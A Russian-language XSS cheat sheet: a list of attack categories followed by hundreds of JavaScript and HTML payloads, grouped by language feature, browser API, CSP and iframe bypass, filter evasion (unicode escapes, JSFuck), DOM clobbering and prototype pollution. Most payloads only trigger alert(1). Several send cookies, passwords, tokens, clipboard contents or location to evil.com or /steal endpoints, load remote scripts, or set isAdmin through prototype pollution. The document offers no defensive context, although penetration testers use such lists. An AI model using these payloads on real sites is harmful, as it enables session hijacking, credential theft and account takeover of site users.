обзор

✅ **Классика** - `<script>alert(1)</script>` и вариации  
✅ **Прототип поллюшн** - `__proto__` атаки  
✅ **Приведение типов** - toString/valueOf трюки  
✅ **Символы** - Symbol атаки  
✅ **BigInt** - неожиданные векторы  
✅ **Функции** - Function constructor, стрелки, async  
✅ **Объекты** - defineProperty, getters/setters  
✅ **Массивы** - все методы перебора  
✅ **Циклы** - for/while/do с XSS  
✅ **Классы** - constructor, static, extends  
✅ **Ошибки** - throw/catch стек  
✅ **Event Loop** - setTimeout/Promise/microtasks  
✅ **Промисы** - then/catch/finally  
✅ **Async/Await** - современный синтаксис  
✅ **События** - message, hashchange, popstate  
✅ **Storage** - localStorage/sessionStorage/cookies  
✅ **Network** - fetch/XHR/WebSocket  
✅ **Web APIs** - geolocation/clipboard/workers  
✅ **CSP обход** - всякие трюки  
✅ **Iframe** - sandbox обход  
✅ **Обход фильтров** - юникод, JSFuck, комменты  
✅ **DOM Clobbering** - переопределение через DOM  
✅ **Template Injection** - для всех фреймворков  
✅ **CSS инъекции** - expression, url  
✅ **Web Components** - math, video, audio  
✅ **Service Workers** - перехват запросов  
✅ **WebAssembly** - компиляция XSS  
✅ **React/Vue/Angular** - фреймворк-специфик  
✅ **jQuery** - старый добрый  
✅ **Side-channel** - тайминги, кэш  
✅ **Битовые трюки** - tagged templates  
✅ **WebRTC** - получение IP  
✅ **Фингерпринтинг** - определение браузера  
✅ **AdBlock детект** - обход рекламы  
✅ **Import maps** - современные модули  
✅ **Trusted Types** - обход политик
✅ РАЗНОЕ ДРУГОЕ 

```js







{ script: '<script>alert(1)</script>' }
{ "__proto__": { "polluted": "<img src=x onerror=alert(1)>" } }
{ toString: () => '<img src=x onerror=alert(1)>' }
{ valueOf: () => '<img src=x onerror=alert(1)>'}
{ toString: () => '<img src=x onerror=alert(1)>', valueOf: () => '<img src=x onerror=alert(1)>'}
{ "constructor": { "prototype": { "polluted": "XSS" } } }
['<img src=x onerror=alert(1)>']
null
0
let syms = Object.getOwnPropertySymbols(vulnerableApp); syms.forEach(sym => { fetch('/steal?data=' + vulnerableApp[sym]) })
Object.getOwnPropertySymbols(vulnerableApp).forEach(sym => { if (sym.toString().includes('secret')) { vulnerableApp[sym] = 'HACKED' } })
let payload = { [sym]: '<img src=x onerror=alert(1)>'}
Array.prototype[Symbol.iterator] = function() { alert('XSS при итерации!') return originalIterator }
BigInt('12345678901234567890')
(function(){ let x = 1n; x(); })()
BigInt('12345678901234567890')
0n
1n
5n + 5
9007199254740991n
{ "amount": "12345678901234567890n" }
let evil = { toString: function() { return '<script>alert(1)</script>' } }
let evilArray = ['<img src=x onerror=alert(1)>']
'alert(1)'
Function('alert(1)')()
"0"
[]
{}
let sym = Symbol('xss')
{ toString: () => '<img src=x onerror=alert(1)>' }
{ valueOf: () => '<img src=x onerror=alert(1)>' }
{ toString: () => '<img src=x onerror=alert(1)>', valueOf: () => '<img src=x onerror=alert(1)>' }
['<img src=x onerror=alert(1)>']
{ [Symbol.toPrimitive]: (hint) => '<img src=x onerror=alert(1)>' }
String('<img src=x onerror=alert(1)>')
Number('<img src=x onerror=alert(1)>')
parseInt('<img src=x onerror=alert(1)>')
'Message: ' + { toString: () => '<img src=x onerror=alert(1)>' }
`${ { toString: () => '<img src=x onerror=alert(1)>' } }`
+{ valueOf: () => '<img src=x onerror=alert(1)>' }
{ valueOf: () => '<img src=x onerror=alert(1)>' } > 0
{ toString: () => '<img src=x onerror=alert(1)>' } && true
if ({ toString: () => '<img src=x onerror=alert(1)>' }) { /* XSS */ }
userInput || '<img src=x onerror=alert(1)>'
{ toString: () => '<img src=x onerror=alert(1)>'}
{ valueOf: () => '<img src=x onerror=alert(1)>'}
{ toString: () => '<script>alert(1)</script>', valueOf: () => '<img src=x onerror=alert(1)>'}
"false" 
function(){} 
undefined
NaN
""
''
{ [Symbol.toPrimitive]: (hint) => { if (hint === 'string') return '<img src=x onerror=alert(1)>'; if (hint === 'number') return 1337; return 'default XSS'; } }
"123px"
{ valueOf: () => "123" }
String({ toString: () => '<img src=x onerror=alert(1)>' })
0n
let payload = { data: '<img src=x onerror=alert(1)>', toString() { return this.data }, valueOf() { return this.data }, [Symbol.toPrimitive](hint) { return this.data } }
[] + {}
{} + []
eval("[] + {}")
eval("{} + []")
{} + [] + {}
[] + {} + []
({} + [])
5 + [] + {}
5 + {} + []\
eval("([] + {})")
eval("({} + [])")
'<script>alert(1)</script>'
['<script>', 'alert(1)', '</script>']
'number'
'<img src=x onerror=alert(1)>'

// 1.1 ТИПЫ ДАННЫХ
{ script: '<script>alert(1)</script>' }
{ "__proto__": { "polluted": "<img src=x onerror=alert(1)>" } }
{ toString: () => '<img src=x onerror=alert(1)>' }
{ valueOf: () => '<img src=x onerror=alert(1)>' }
{ toString: () => '<script>alert(1)</script>', valueOf: () => '<img src=x onerror=alert(1)>' }
{ "constructor": { "prototype": { "polluted": "XSS" } } }
['<img src=x onerror=alert(1)>']
null
Object.prototype.polluted = 'XSS payload'
{ [Symbol.toPrimitive]: (hint) => '<img src=x onerror=alert(1)>' }
{ [Symbol.toPrimitive]: (hint) => { if (hint === 'string') return '<img src=x onerror=alert(1)>'; return 'default' } }
Symbol('xss')
Symbol.for('shared')
Object.getOwnPropertySymbols(vulnerableApp)[0]
BigInt('12345678901234567890')
1n
(function(){ let x = 1n; x(); })()

// 1.2 ПРИВЕДЕНИЕ ТИПОВ
{ toString: () => '<img src=x onerror=alert(1)>' }
{ valueOf: () => '<img src=x onerror=alert(1)>' }
{ toString: () => '<script>alert(1)</script>', valueOf: () => '<img src=x onerror=alert(1)>' }
"0"
[]
{}
"false"
function(){}
0
""
null
undefined
NaN
{ [Symbol.toPrimitive]: (hint) => '<img src=x onerror=alert(1)>' }
"123px"
String({ toString: () => '<img src=x onerror=alert(1)>' })
[] + {}
{} + []
({} + [])
5 + [] + {}
eval("[] + {}")
eval("({} + [])")
{ [Symbol.toPrimitive]: (hint) => { if (hint === 'number') return 1337; return '<img src=x onerror=alert(1)>'; } }
{ valueOf: () => '<img src=x onerror=alert(1)>' } > 0
{ toString: () => '<img src=x onerror=alert(1)>' } && true
userInput || '<img src=x onerror=alert(1)>'

// 1.3 ФУНКЦИИ
(function(){ alert(1) })()
(() => { alert(1) })()
(async () => { alert(1) })()
true && function(){alert(1)}()
0 || function(){alert(1)}()
void function(){alert(1)}()
!function(){alert(1)}()
javascript: (function(){alert(1)})()
"><img src=x onerror="(function(){var s=document.createElement('script');s.src='http://evil.com/xss.js';document.body.appendChild(s)})()"
new Function('alert(1)')()
Function('alert(1)')()
[].map.constructor('alert(1)')()
[].filter.constructor('alert(1)')()
[].forEach.constructor('alert(1)')()
"".substring.constructor('alert(1)')()
({}).constructor.constructor('alert(1)')()
(0).constructor.constructor('alert(1)')()
new Error().constructor.constructor('alert(1)')()
RegExp.prototype.constructor.constructor('alert(1)')()
String = function(original) { return function(str) { const result = new original(str); result.xssPayload = '<script>alert(1)</script>'; return result; }; }(String);
Attack.prototype = { toString: function() { return '<img src=x onerror=alert(1)>'; } };
Object.setPrototypeOf(fake, User.prototype)
window.constructor.prototype.xss = 'payload'
stolen.bind(secretObj)
function(){ throw new Error('xss') }
(function(){ try { null() } catch(e) { console.log(e.stack) } })()

// 1.4 ОБЪЕКТЫ
new String('XSS')
new Number(42)
new Boolean(false)
Object.create(null)
Object.defineProperty({}, 'payload', { value: '<script>alert(1)</script>', enumerable: false })
Object.defineProperty({}, 'danger', { get() { alert(1) } })
Object.defineProperty(window, 'security', { value: check, configurable: false })
Object.setPrototypeOf([], { push() { alert(1) } })
Object.setPrototypeOf({}, null)
Object.prototype.hasOwnProperty = function() { return true; }
Object.prototype.toString = function() { return '<img src=x onerror=alert(1)>'; }
JSON.parse('{"__proto__": {"isAdmin": true}}')
JSON.parse('{"__proto__": {"polluted": "<img src=x onerror=alert(1)>"}}')
Object.assign({}, { get x() { alert(1); return 42; } })
{ ...{ get x() { alert(1); return 42; } } }
Object.create({ get name() { alert(1); return 'evil'; } })
{ get name() { alert(1); return 'evil'; } }
{ set password(val) { fetch('https://evil.com/steal?p=' + val) } }

// 1.5 МАССИВЫ
[1,2,3].forEach(x => { if(x===2) alert(1) })
[1,2,3].map(x => { alert(1); return x*2 })
[1,2,3].filter(x => { alert(1); return x>1 })
[1,2,3].reduce((acc, x) => { alert(1); return acc+x }, 0)
[1].find(x => { alert(1); return false })
[1].some(x => { alert(1); return false })
[1].every(x => { alert(1); return true })
Array.prototype[Symbol.iterator] = function() { alert(1); return [][Symbol.iterator].call(this); }
Array.prototype.push = function() { alert(1); return Array.prototype.push.apply(this, arguments); }
Object.defineProperty(Array.prototype, '0', { get() { alert(1); return 1; } })
Array.from({ length: 2, get 0() { alert(1); return 'x'; } })
[].map.constructor('alert(1)')()
[1,2,3].sort((a,b) => { alert(1); return a-b })
[1,2,3].reverse(x => { alert(1) })

// 1.6 ЦИКЛЫ И УСЛОВИЯ
for (let i = 0, x = alert(1); i < 1; i++) {}
for (let i = 0; i < 1e9; i++) { if(i===0) alert(1) }
while(confirm('XSS?')) { alert(1) }
do { alert(1) } while (false)
for (let key in { get a() { alert(1); return 1 } }) {}
for (let val of { [Symbol.iterator]: function*() { yield alert(1); yield 2 } }) {}
xss && alert(1)
xss || alert(1)
isAdmin ? alert(1) : 0
1 ? 0 : alert(1)
switch(1) { case 1: alert(1); break; }
userInput?.__proto__?.polluted
0 ?? alert(1)
null ?? (alert(1), 'xss')
eval('label: { alert(1); break label; }')

// 1.7 КЛАССЫ
class XSS { constructor() { alert(1) } }
new class { constructor() { alert(1) } }
class XSS { static { alert(1) } }
class XSS extends Array { constructor() { super(); alert(1) } }
User.prototype.xss = function() { alert(1) }
Player.prototype.getInfo = function() { alert(1); return 'hacked' }
MathUtils.add = function(a,b) { alert(1); return a+b }
Array.prototype[Symbol.hasInstance] = () => true
class NotAdmin { static [Symbol.hasInstance](obj) { alert(1); return obj.role === 'admin' } }
Object.assign(User.prototype, { log: () => alert(1) })

// 1.8 ОШИБКИ
try { throw new Error('xss') } catch(e) { alert(e.message) }
try { eval('alert(1)') } catch(e) { location='http://evil.com?error='+e.message }
try { null.x() } catch(e) { fetch('/steal?stack='+encodeURIComponent(e.stack)) }
throw new Error('XSS')
throw '<img src=x onerror=alert(1)>'
throw { toString: () => '<script>alert(1)</script>' }
class XSSError extends Error { constructor() { super('xss'); this.payload='<img src=x onerror=alert(1)>' } }
new XSSError()
try { setTimeout(() => { throw new Error('xss') }, 1000) } catch(e) {}
try { Promise.reject('xss') } catch(e) {}
new Error().stack.constructor.constructor('alert(1)')()

// 2.1 EVENT LOOP
setTimeout("alert(1)", 0)
setTimeout(() => { alert(1) }, 0)
setInterval("alert(1)", 1000)
Promise.resolve().then(() => alert(1))
queueMicrotask(() => alert(1))
new Promise(() => alert(1))
Promise.reject().catch(() => alert(1))
fetch('/').then(() => alert(1))
window.addEventListener('load', () => alert(1))
document.addEventListener('DOMContentLoaded', () => alert(1))

// 2.2 ПРОМИСЫ
new Promise(() => alert(1))
Promise.resolve(1).then(() => alert(1))
Promise.reject(1).catch(() => alert(1))
Promise.all([Promise.resolve(1)]).then(() => alert(1))
Promise.race([Promise.resolve(1)]).then(() => alert(1))
Promise.resolve({ then: (r) => { alert(1); r(42) } })
new Promise(r => r()).then(() => { throw new Error('xss') })
fetch('/').finally(() => alert(1))
Promise.resolve().then(() => { return new Promise(r => { alert(1); r() }) })

// 2.3 ASYNC/AWAIT
async function xss() { await null; alert(1) }; xss()
(async () => { await null; alert(1) })()
(async () => { await { then: (r) => { alert(1); r() } } })()
(async () => { try { await Promise.reject() } catch { alert(1) } })()
(async () => { return alert(1) })()
(async () => { throw new Error('xss') })().catch(() => {})
await new Promise(r => { alert(1); r() })
Promise.all([(async () => { alert(1) })()])
Promise.race([(async () => { alert(1) })()])

// 2.4 СОБЫТИЯ
window.addEventListener('message', (e) => eval(e.data))
window.addEventListener('message', (e) => { alert(e.data) })
parent.postMessage('alert(1)', '*')
new CustomEvent('xss', { detail: '<img src=x onerror=alert(1)>' })
window.dispatchEvent(new CustomEvent('xss', { detail: alert(1) }))
document.addEventListener('click', (e) => eval(e.target.getAttribute('data-xss')))
window.addEventListener('hashchange', () => eval(location.hash.slice(1)))
window.addEventListener('popstate', (e) => eval(e.state?.xss))
history.pushState({xss: 'alert(1)'}, '', '')
document.body.addEventListener('click', (e) => e.stopPropagation(), { capture: true })
EventTarget.prototype.addEventListener = function(type, fn) { return original.call(this, type, function(e) { alert(1); return fn(e) }) }

// 3.1 OBJECT
Object.prototype.xss = 'alert(1)'
Object.prototype.toString = () => '<img src=x onerror=alert(1)>'
Object.defineProperty({}, 'xss', { get: () => alert(1) })
Object.defineProperty(localStorage, 'token', { get() { fetch('https://evil.com/steal?t='+this._token); return this._token } })
Object.setPrototypeOf({}, { toString: () => '<img src=x onerror=alert(1)>' })
Object.assign({}, { get x() { alert(1); return 42 } })
Object.freeze({ x: alert(1) })
Object.seal({ x: alert(1) })
Object.preventExtensions({ x: alert(1) })
Object.fromEntries([['x', alert(1)]])

// 3.2 STRING
String.fromCharCode(97,108,101,114,116,40,49,41)
[97,108,101,114,116,40,49,41].map(x => String.fromCharCode(x)).join('')
'aler'.concat('t')
'alert(1)'.slice(0,5)
'XSSalert()'.slice(3)
'<script>alert(1)</script>'.replace(/<script>/i, '')
'<script>alert(1)</script>'.replace(/alert/g, '')
'ALERT(1)'.toLowerCase()
'<script>alert(1)</script>'.trim()
'\u200B<script>alert(1)</script>'
['a','l','e','r','t','(','1',')'].join('')
'<script>'.repeat(1) + 'alert(1)' + '</script>'.repeat(1)
String.raw`<script>alert(1)<\/script>`
String.raw`\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029`
'alert(1)'.padStart(100, 'a')
'<img src=x onerror=alert(1)>'.charAt(0)

// 3.3 ARRAY
[].map.constructor('alert(1)')()
[].filter.constructor('alert(1)')()
[].forEach.constructor('alert(1)')()
[1,2,3].flatMap(x => { alert(1); return [x] })
[1,2,3].reduce((acc, x) => { alert(1); return acc+x }, 0)
[1,2,3].reduceRight((acc, x) => { alert(1); return acc+x }, '')
Array(100).fill('<img src=x onerror=alert(1)>')
[1,2,3].copyWithin(0,1,2)
Array.from({ length: 2, get 0() { alert(1); return 'x' } })
[1,2,3].sort((a,b) => { alert(1); return a-b })
[1,2,3].splice(0,1,alert(1))
[1,2,3].reverse(x => { alert(1) })

// 3.4 NUMBER & MATH
parseInt('alert(1)', 36)
parseInt('0xFFFFFFFF', 16)
isNaN('<script>')
Number.isNaN('<script>')
Math.max(alert(1), 1, 2, 3)
Math.min(1, 2, alert(1), 3)
Math.round(alert(1))
Math.floor(alert(1))
Math.ceil(alert(1))
Math.trunc(alert(1))
Math.random.toString() + alert(1)
Math.pow(2, alert(1))
Math.sqrt(alert(1))
Math.abs(alert(1))
Math.sign(alert(1))

// 3.5 DATE
new Date('<img src=x onerror=alert(1)>')
Date.parse('alert(1)')
new Date().toString = () => '<img src=x onerror=alert(1)>'
new Date().toISOString = () => '<img src=x onerror=alert(1)>'
new Date().getTime = () => { alert(1); return 0 }
Date.now = () => { alert(1); return 0 }

// 3.6 REGEXP
new RegExp('alert\\(1\\)')
/alert\(1\)/.test(alert(1))
/.*/.test(alert(1))
new RegExp('.*', 'g').exec('alert(1)')
/<script>alert\(1\)<\/script>/i.test('<SCRIPT>ALERT(1)</SCRIPT>')
/<.*>/.test('<script>alert(1)</script>')
/(a+)+b/.test('aaaaaaaaaaaaaaaaaaaaaaaaaaaaac')
/(?<=<script>).*(?=<\/script>)/.exec('<script>alert(1)</script>')
/\p{Script=Latin}+/u.exec('alert(1)')

// 3.7 MAP/SET/WEAK
new Map([['x', alert(1)]])
new Set([alert(1)])
new WeakMap([[{}, alert(1)]])
new WeakSet([{ toString: () => { alert(1); return 'x' } }])
map.set('x', alert(1))
set.add(alert(1))
weakmap.set({}, alert(1))
weakset.add({ toString: () => { alert(1); return 'x' } })
Map.prototype.get = function() { alert(1); return 'x' }
Set.prototype.has = function() { alert(1); return true }

// 4.1 WINDOW
window.alert(1)
self.alert(1)
top.alert(1)
parent.alert(1)
frames[0].alert(1)
window['alert'](1)
window['aler' + 't'](1)
location.href = 'javascript:alert(1)'
location.replace('javascript:alert(1)')
location.hash = '#<img src=x onerror=alert(1)>'
history.pushState({}, '', 'javascript:alert(1)')
history.replaceState({}, '', 'javascript:alert(1)')
window.open('javascript:alert(1)')
window.name = 'alert(1)'
window.status = 'alert(1)'
window.closed = false

// 4.2 DOCUMENT
document.write('<img src=x onerror=alert(1)>')
document.writeln('<img src=x onerror=alert(1)>')
document.body.innerHTML = '<img src=x onerror=alert(1)>'
document.body.outerHTML = '<img src=x onerror=alert(1)>'
document.body.insertAdjacentHTML('beforeend', '<img src=x onerror=alert(1)>')
document.documentElement.innerHTML = '<img src=x onerror=alert(1)>'
document.getElementById('xss').innerHTML = '<img src=x onerror=alert(1)>'
document.querySelector('#xss').innerHTML = '<img src=x onerror=alert(1)>'
document.createElement('img').setAttribute('onerror', 'alert(1)')
document.body.appendChild(document.createElement('img')).setAttribute('onerror', 'alert(1)')
document.domain = 'evil.com'
document.cookie = 'session=123'
document.location = 'javascript:alert(1)'
document.referrer = 'https://evil.com'
document.title = '<img src=x onerror=alert(1)>'

// 4.3 ELEMENT
element.setAttribute('onerror', 'alert(1)')
element.setAttribute('onload', 'alert(1)')
element.setAttribute('onclick', 'alert(1)')
element.setAttribute('onmouseover', 'alert(1)')
element.setAttribute('onfocus', 'alert(1)')
element.setAttribute('onblur', 'alert(1)')
element.setAttribute('onchange', 'alert(1)')
element.setAttribute('onsubmit', 'alert(1)')
element.setAttribute('onreset', 'alert(1)')
element.setAttribute('onkeydown', 'alert(1)')
element.setAttribute('onkeyup', 'alert(1)')
element.setAttribute('onkeypress', 'alert(1)')
element.setAttribute('oncopy', 'alert(1)')
element.setAttribute('oncut', 'alert(1)')
element.setAttribute('onpaste', 'alert(1)')
element.setAttribute('oninput', 'alert(1)')
element.setAttribute('oninvalid', 'alert(1)')
element.setAttribute('onselect', 'alert(1)')
element.setAttribute('onsearch', 'alert(1)')
element.dataset.xss = '<img src=x onerror=alert(1)>'
element.classList.add('xss')
element.style.background = 'url(javascript:alert(1))'
element.style.backgroundImage = 'url("javascript:alert(1)")'
element.click = () => alert(1)
element.focus = () => alert(1)
element.blur = () => alert(1)

// 4.4 СОБЫТИЯ
element.onclick = () => alert(1)
element.onload = () => alert(1)
element.onerror = () => alert(1)
element.onmouseover = () => alert(1)
element.onmouseenter = () => alert(1)
element.onmouseleave = () => alert(1)
element.onmousedown = () => alert(1)
element.onmouseup = () => alert(1)
element.onmousemove = () => alert(1)
element.onkeydown = () => alert(1)
element.onkeyup = () => alert(1)
element.onkeypress = () => alert(1)
element.onfocus = () => alert(1)
element.onblur = () => alert(1)
element.onchange = () => alert(1)
element.oninput = () => alert(1)
element.onsubmit = () => alert(1)
element.onreset = () => alert(1)
element.onselect = () => alert(1)
element.oncopy = () => alert(1)
element.oncut = () => alert(1)
element.onpaste = () => alert(1)
element.ontouchstart = () => alert(1)
element.ontouchmove = () => alert(1)
element.ontouchend = () => alert(1)
element.ontouchcancel = () => alert(1)
element.ondrag = () => alert(1)
element.ondragstart = () => alert(1)
element.ondragend = () => alert(1)
element.ondragenter = () => alert(1)
element.ondragover = () => alert(1)
element.ondragleave = () => alert(1)
element.ondrop = () => alert(1)
element.onscroll = () => alert(1)
element.onwheel = () => alert(1)
element.onanimationstart = () => alert(1)
element.onanimationend = () => alert(1)
element.onanimationiteration = () => alert(1)
element.ontransitionstart = () => alert(1)
element.ontransitionend = () => alert(1)
element.ontransitioncancel = () => alert(1)

// 4.5 STORAGE
localStorage.setItem('xss', '<img src=x onerror=alert(1)>')
localStorage.getItem('xss')
sessionStorage.setItem('xss', '<img src=x onerror=alert(1)>')
sessionStorage.getItem('xss')
document.cookie = 'xss=<img src=x onerror=alert(1)>'
document.cookie = 'session=123; domain=.evil.com'
localStorage.clear()
sessionStorage.clear()
indexedDB.open('xss', 1)
caches.open('xss').then(cache => cache.add('/'))
caches.keys().then(names => names.forEach(name => caches.delete(name)))

// 4.6 FETCH & NETWORK
fetch('https://evil.com/steal?cookie='+document.cookie)
fetch('https://evil.com/steal', {method:'POST', body:document.cookie})
fetch('javascript:alert(1)')
fetch('data:text/plain,alert(1)').then(r=>r.text()).then(eval)
new XMLHttpRequest().open('GET', 'https://evil.com/steal?'+document.cookie)
new XMLHttpRequest().open('GET', 'javascript:alert(1)')
new WebSocket('wss://evil.com').onopen = () => send(document.cookie)
new EventSource('/events').onmessage = (e) => eval(e.data)
navigator.sendBeacon('/log', document.cookie)
fetch('/api', {credentials:'include'})
fetch('https://target.com/api', {mode:'no-cors'})

// 4.7 TIMERS
setTimeout('alert(1)', 0)
setInterval('alert(1)', 1000)
setTimeout(() => alert(1), 0)
setInterval(() => alert(1), 1000)
requestAnimationFrame(() => alert(1))
requestIdleCallback(() => alert(1))
setTimeout(alert, 0, 1)
setTimeout('document.write("<img src=x onerror=alert(1)>")', 0)
setInterval('document.write("<img src=x onerror=alert(1)>")', 1000)

// 4.8 ENCODING
encodeURI('<script>alert(1)</script>')
decodeURI('%3Cscript%3Ealert(1)%3C/script%3E')
encodeURIComponent('<script>alert(1)</script>')
decodeURIComponent('%3Cscript%3Ealert(1)%3C%2Fscript%3E')
escape('<script>alert(1)</script>')
unescape('%3Cscript%3Ealert(1)%3C/script%3E')
btoa('alert(1)')
atob('YWxlcnQoMSk=')
btoa(unescape(encodeURIComponent('alert(1)')))
new TextEncoder().encode('alert(1)')
new TextDecoder().decode(new Uint8Array([97,108,101,114,116,40,49,41]))

// 4.9 WEB APIS
navigator.geolocation.getCurrentPosition(p => fetch('/steal?lat='+p.coords.latitude))
navigator.mediaDevices.getUserMedia({video:true}).then(s => {})
navigator.clipboard.readText().then(t => fetch('/steal?clip='+t))
navigator.clipboard.writeText('rm -rf /')
new FileReader().readAsText(new File(['xss'], 'xss.txt'))
new Worker('data:application/javascript,alert(1)')
new Worker(URL.createObjectURL(new Blob(['alert(1)'])))
new RTCPeerConnection().createOffer().then(() => {})
document.createElement('canvas').getContext('2d').fillText('xss',0,0)
new AudioContext().createOscillator().start()
navigator.getBattery().then(b => fetch('/steal?b='+b.level))
navigator.connection.addEventListener('change', () => alert(1))

// 5.1 SAME-ORIGIN POLICY
document.domain = 'example.com'
window.postMessage('alert(1)', '*')
window.addEventListener('message', (e) => eval(e.data))
parent.postMessage('alert(1)', '*')
frames[0].postMessage('alert(1)', '*')
window.opener.postMessage('alert(1)', '*')
<iframe src="javascript:alert(1)"></iframe>
<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
<script src="https://evil.com/xss.js"></script>
<img src="https://evil.com/steal?"+document.cookie>
<link rel="stylesheet" href="https://evil.com/xss.css">

// 5.2 CONTENT SECURITY POLICY
<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'">
<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-eval'">
<script nonce="abc123">alert(1)</script>
<script src="https://trusted.com/jsonp?callback=alert(1)"></script>
<base href="https://evil.com/">
<iframe src="javascript:alert(1)"></iframe>
<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
<meta http-equiv="refresh" content="0; url=javascript:alert(1)">
<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>

// 5.3 COOKIES
document.cookie = 'session=123; domain=.evil.com'
document.cookie = 'session=123; path=/'
document.cookie = 'session=123; max-age=3600'
document.cookie = 'session=123; expires=Wed, 21 Oct 2025 07:28:00 GMT'
document.cookie = 'session=123; secure'
document.cookie = 'session=123; samesite=none'
document.cookie = '__Host-session=123; secure; path=/'
document.cookie = '__Secure-session=123; secure'

// 5.4 IFRAME
<iframe src="javascript:alert(1)"></iframe>
<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
<iframe srcdoc="<script>alert(1)</script>"></iframe>
<iframe sandbox="allow-scripts" src="javascript:alert(1)"></iframe>
<iframe sandbox="allow-scripts allow-same-origin" src="https://target.com"></iframe>
<iframe src="https://target.com" onload="alert(1)"></iframe>
<iframe src="about:blank" onload="alert(1)"></iframe>
<style> iframe { position:absolute; top:0; left:0; opacity:0; } </style>
<iframe src="https://target.com/admin/delete"></iframe>
<button onclick="alert(1)">click</button>

// 6.1 ОБХОД ФИЛЬТРОВ
\u0061lert(1)
\x61lert(1)
\141lert(1)
eval('\\x61lert(1)')
alert/**/(1)
alert/*xss*/(1)
alert\t(1)
alert\n(1)
alert\r(1)
alert\f(1)
javas\u0009cript:alert(1)
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[!+[]+!+[]]+(!![]+[])[+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]])())
<svg onload="alert(1)">
<svg onload="alert(1)">
<svg onload="alert(1)">
<svg onload="alert(1)">
<svg onload="alert(1)">
<svg onload="alert(1)">
<svg onload="alert(1)">
<svg onload="alert(1)">
<svg onload="alert(1)">
<svg onload="alert(1)">
<svg onload="alert(1)">
<svg onload="alert(1)">
<svg onload="alert(1)">

// 6.2 DOM CLOBBERING
<div id="user"></div>
<form id="config"><input name="isAdmin" value="true"></form>
<form id="user"><input name="name" value="admin"><form id="user"><input name="role" value="admin"></form></form>
<form id="hasOwnProperty"><input name="xss" value="payload"></form>
<a id="user" href="javascript:alert(1)"></a>
<img id="user" src=x onerror=alert(1)>
<script id="user">alert(1)</script>
<iframe id="user" src="javascript:alert(1)"></iframe>
<embed id="user" src="javascript:alert(1)">
<object id="user" data="javascript:alert(1)"></object>
<div id="config" data-isadmin="true"></div>
<input id="user" name="isAdmin" value="true">
<button id="user" onclick="alert(1)">click</button>

// 6.3 PROTOTYPE POLLUTION
{"__proto__": {"isAdmin": true}}
{"__proto__": {"polluted": "<img src=x onerror=alert(1)"}}
{"constructor": {"prototype": {"polluted": "XSS"}}}
Object.prototype.polluted = true
Object.prototype.role = 'admin'
Object.prototype.token = 'hacked'
Object.prototype.toString = () => '<img src=x onerror=alert(1)>'
JSON.parse('{"__proto__": {"isAdmin": true}}')
JSON.parse('{"__proto__": {"polluted": "<img src=x onerror=alert(1)"}}')
merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'))
extend(true, {}, JSON.parse('{"__proto__": {"polluted": true}}'))
$.extend(true, {}, JSON.parse('{"__proto__": {"xss": true}}'))
